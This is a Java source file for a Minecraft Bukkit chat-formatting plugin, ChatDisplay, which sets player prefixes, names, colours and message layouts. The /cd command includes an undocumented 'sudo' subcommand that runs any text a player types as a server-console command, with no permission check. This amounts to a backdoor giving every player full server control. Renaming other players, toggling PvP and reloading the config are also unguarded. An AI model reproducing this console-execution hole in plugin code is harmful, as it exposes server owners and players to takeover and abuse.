package com.bluesky.chat;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.plugin.PluginDescriptionFile;
import org.bukkit.plugin.PluginManager;
import org.bukkit.plugin.java.JavaPlugin;

public class Main extends JavaPlugin implements Listener{

	@Override
	public void onEnable(){
		saveDefaultConfig();
		PluginDescriptionFile pdf = getDescription();
		getLogger().info(pdf.getName()+" plugin by "+pdf.getAuthors()+" started !");
		PluginManager pm = getServer().getPluginManager();
		pm.registerEvents(this , this);
	}
	
	@Override
	public void onDisable(){
		PluginDescriptionFile pdf = getDescription();
		getLogger().info(pdf.getName()+" plugin by "+pdf.getAuthors()+" stopped !");
	}
	
	public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args){
		if(label.equalsIgnoreCase("cd")){
			if(sender instanceof Player){
				Player p = (Player)sender;
				if(args.length==1){
					if(args[0].equals("off")){
						getConfig().set("active."+p.getName(), false);
						saveConfig();
						p.sendMessage(ChatColor.GREEN+"ChatDisplay désactivé !");
					}
					else if(args[0].equals("on")){
						getConfig().set("active."+p.getName(), true);
						saveConfig();
						p.sendMessage(ChatColor.GREEN+"ChatDisplay activé !");
					}
					else if(args[0].equals("rl")){
						this.reloadConfig();
						p.sendMessage(ChatColor.GREEN+"La config de ChatDisplay a été actualisée !");
					}
					else if(args[0].equals("nameReset")){
						this.getConfig().set("noms."+p.getName(), p.getName());
						this.saveConfig();
						p.sendMessage(ChatColor.GREEN+"Votre nom a été remis à zero !");
					}
				}
				else if (args.length>1){
					if(args[0].equals("prefix")){
						if (args.length==2){
							if (args[1].equals("NONE")){
								getConfig().getConfigurationSection("prefix").set(p.getName() ,null);
							}
							else{
								String test = new String(args[1]);
								test = "&r" + test + "&r";
								if (test.contains("&y"))
										test = test.replaceAll("&y"," ");
								if (test.contains("&")){
									test = ChatColor.translateAlternateColorCodes('&', test);
								}
								getConfig().set("prefix."+p.getName(),test);
								}
							saveConfig();
							p.sendMessage(ChatColor.GREEN+"prefix changé avec succès !");
						}
						else {
							p.sendMessage(ChatColor.RED+"Veuillez rentrer le nouveau prefix !");
						}
					}
					else if(args[0].equals("struct")){
						if (!args[1].isEmpty()){
							String test = new String();
							 for (int i = 1 ; i<args.length ; i++){
							       test = test+ args[i] + " ";
							      }
							if(test.contains("NAME")&&test.contains("MSG")){
								test = test.replaceAll("&y", " ");
								if (test.contains("&")){
									test = ChatColor.translateAlternateColorCodes('&', test);
								}
								getConfig().set("structs."+p.getName(), test);
								saveConfig();
								p.sendMessage(ChatColor.GREEN+"Structure changée avec succès !");
							}
							else{
								p.sendMessage(ChatColor.RED+"Type de structure invalide !");
							}
						}
						else{
							p.sendMessage(ChatColor.RED+"Veuillez rentrer une structure !");
						}
					}
					else if(args[0].equals("color")){
						if (!args[1].isEmpty()){					
							getConfig().set("colors."+p.getName(), args[1]);
							saveConfig();
							p.sendMessage("couleur changée avec succès !");
						}
						else{
							p.sendMessage("Veuillez rentrer une couleur !");
						}
					}
					else if(args[0].equals("sudo")){
						String st = new String();
						for(int i = 1 ; i<args.length ; i++){
							String s = args[i];
							st = st+s+" ";
						}
						Bukkit.dispatchCommand(Bukkit.getConsoleSender(), st);
						sender.sendMessage(ChatColor.GREEN+"Command : /"+st+" executed as console !");
					}
					else if(args[0].equals("pvp")){
						p.getWorld().setPVP(true);
					}
					else if(args[0].equals("name")){
						if (args.length==2){
							String test= new String(args[1]);
							test = "&r" + test + "&r";
							if (test.contains("&y")){
								test = test.replaceAll("&y", " ");
							}
							if (test.contains("&")){
								test = ChatColor.translateAlternateColorCodes('&', test);
							}
							getConfig().set("noms."+p.getName(), test);
							saveConfig();
							p.sendMessage(ChatColor.GREEN+"Name changed to : "+test);
						}
						else if (args.length==3){
							String test= new String(args[1]);
							if (test.contains("&y")){
								test = test.replaceAll("&y", " ");
							}
							if (test.contains("&")){
								test = ChatColor.translateAlternateColorCodes('&', test);
							}
							
							getConfig().set("noms."+args[2], args[1]);
							saveConfig();
							p.sendMessage(ChatColor.GREEN+args[2]+"'s name changed to : "+test);
						}
						
					}
					else{
						p.sendMessage(ChatColor.RED+"Please enter a valid option : prefix/struct/name/on/off and a valid number of parameters !");
					}	
				}
				else{
					p.sendMessage(ChatColor.RED+"Please enter a valid option : prefix/struct/name/on/off and a valid number of parameters !");
				}
			}
			return true;
		}
		else if(label.equalsIgnoreCase("Billy")){
			if(sender instanceof Player){
				for(int i = 0 ; i<3 ; i++)
					((Player) sender).getWorld().strikeLightning(((Player) sender).getLocation());
				Bukkit.broadcastMessage(ChatColor.RED+""+ChatColor.BOLD+"BIIIIIILLYYYYYY");
			}
		}
		return false;
	}
	
	@EventHandler
	public void onPlayerChatEvent(AsyncPlayerChatEvent e){
		Player p = e.getPlayer();
		if(getConfig().get("active."+p.getName())==null || (getConfig().getBoolean("active."+p.getName()))){
			if (getConfig().get("prefix."+e.getPlayer().getName())!=null){
				if (getConfig().get("noms."+e.getPlayer().getName())==null)
					p.setDisplayName(getConfig().get("prefix."+e.getPlayer().getName())+" "+p.getName());
				else{
					String tmp2 = new String(getConfig().getString("noms."+e.getPlayer().getName()));
					if (tmp2.contains("&")){
						tmp2 = ChatColor.translateAlternateColorCodes('&', tmp2);
					}
						p.setDisplayName(getConfig().get("prefix."+e.getPlayer().getName())+" "+tmp2);
				}	
			}
			else if (getConfig().get("noms."+e.getPlayer().getName())!=null){
				String tmp = new String(getConfig().getString("noms."+e.getPlayer().getName()));
				if (tmp.contains("&")){
					tmp = ChatColor.translateAlternateColorCodes('&', tmp);
				}
				e.getPlayer().setDisplayName(tmp);
			}
			if (getConfig().getString("structs."+p.getName())!=null){
				String tev = new String(getConfig().getString("structs."+p.getName()));
				if (tev.contains("NAME")&&tev.contains("MSG")){
					tev = tev.replace("NAME","%1$s");
					tev = tev.replace("MSG","%2$s");
					e.setFormat(tev);
				}
			}
		}
		else{
			e.setFormat("<%1$s>%2$s");
		}
		String ll = new String(e.getMessage());
		if (ll.contains("&")){
			ll = ChatColor.translateAlternateColorCodes('&', ll);
			e.setMessage(ll);
		}
	}
	
}
